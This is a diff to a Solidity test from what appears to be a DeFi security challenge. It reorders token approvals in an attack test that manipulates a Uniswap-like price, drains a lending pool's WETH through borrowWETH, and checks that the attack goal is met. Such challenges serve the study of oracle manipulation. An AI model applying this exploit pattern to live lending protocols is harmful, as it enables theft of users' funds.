@@ -69,10 +69,12 @@ contract PuppetPoolTest is Test {
 
     function testAttackGT() public {
         weth.approve(address(uniswap), UINT256_MAX);
-        token.approve(address(puppetpool), UINT256_MAX);
-        token.approve(address(uniswap), UINT256_MAX);
         uniswap.swapWETHToToken(attackerInitBalance);
+
+        token.approve(address(puppetpool), UINT256_MAX);
         puppetpool.borrowWETH(puppetpoolInitBalance);
+        
+        token.approve(address(uniswap), UINT256_MAX);
         uniswap.swapTokenToWETH(token.balanceOf(attacker));
         require(attackGoal(), "Attack Failed!");
     }
